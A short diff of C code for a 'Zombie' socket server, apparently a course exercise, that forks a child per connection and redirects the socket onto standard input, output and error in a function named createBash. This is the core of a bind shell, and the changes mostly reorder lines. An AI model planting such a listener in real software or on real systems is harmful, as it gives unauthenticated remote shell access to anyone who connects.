@@ -27,8 +27,7 @@ int tabChild[10];
 int numberChild;
 
 Zombie initSocketServer(bool withPort, int portReceived){
-	int sockfd = tabPorts[1];
-	 sockfd = ssocket();
+int sockfd = ssocket();
 	int port;
 	if(withPort == true){
 		port = validPort(sockfd,portReceived);
@@ -46,11 +45,12 @@ Zombie initSocketServer(bool withPort, int portReceived){
 }
 
 void createBash (void * sock){	
-	int* socket = sock;
 	
-	zombie.pid=getpid();
-		swrite(*socket, &zombie, sizeof(Zombie));
 
+	zombie.pid=getpid();
+	int* socket = sock;
+	swrite(*socket, &zombie, sizeof(Zombie));
+	
 	for (int i = 0; i < 3; ++i){
 		dup2(*socket,i);
 	}
@@ -78,7 +78,9 @@ int main(int argc, char const *argv[]){
 	ssigaction(SIGINT,done);
 	printf("Le serveur tourne sur le port : %i \n", zombie.port);	
 	int newsockfd =0;
+
 	while((newsockfd = saccept(zombie.sockFd))>0){	
+		printf("connecter\n");
 		int childId=fork_and_run1(createBash,&newsockfd);
 		tabChild[numberChild]=childId;
 		numberChild++;
